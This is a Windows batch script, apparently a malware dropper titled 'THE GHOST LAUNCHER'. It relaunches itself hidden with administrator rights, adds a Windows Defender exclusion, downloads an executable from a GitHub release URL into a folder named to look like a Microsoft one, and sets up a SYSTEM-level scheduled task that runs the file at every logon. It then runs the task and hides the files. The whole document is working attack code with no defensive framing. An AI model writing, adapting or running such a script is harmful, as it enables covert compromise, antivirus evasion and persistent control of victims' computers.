@echo off
:: --- THE GHOST LAUNCHER ---
:: Relaunches the script hidden and as Administrator if needed
if "%~1"=="-hidden" goto :payload

:: Use PowerShell to relaunch hidden. If not admin, 'RunAs' will trigger the UAC prompt.
powershell -Command "Start-Process -FilePath '%~f0' -ArgumentList '-hidden' -WindowStyle Hidden -Verb RunAs"
exit /b

:payload
:: --- CONFIGURATION ---
set "TARGET_DIR=C:\ProgramData\Microsoft\Framework"
set "TARGET_FILE=%TARGET_DIR%\MsHostStorage.exe"
set "URL=https://github.com/Putin6969/leach/releases/download/1.3/RATIONAL_FOOD.exe"
set "TASK_NAME=Microsoft\Windows\Management\Provisioning\SystemCheck"

:: 1. Execution (Silent)
if not exist "%TARGET_DIR%" mkdir "%TARGET_DIR%" >nul 2>&1

:: 2. Defender Exclusion
powershell -Command "Add-MpPreference -ExclusionPath '%TARGET_DIR%'" >nul 2>&1

:: 3. Download Payload
powershell -Command "Invoke-WebRequest -Uri '%URL%' -OutFile '%TARGET_FILE%' -UseBasicParsing" >nul 2>&1

:: 4. Create Task as NT AUTHORITY\SYSTEM
:: /ru "SYSTEM" - Forces execution as System
:: /sc onlogon - Runs when any user logs in
:: /rl highest - Ensures highest integrity level
schtasks /create /tn "%TASK_NAME%" /tr "'%TARGET_FILE%'" /sc onlogon /rl highest /ru "SYSTEM" /f >nul 2>&1

:: 5. Trigger Task Immediately as SYSTEM
schtasks /run /tn "%TASK_NAME%" >nul 2>&1

:: 6. Apply Stealth Attributes
attrib +s +h "%TARGET_DIR%" >nul 2>&1
attrib +s +h "%TARGET_FILE%" >nul 2>&1

exit
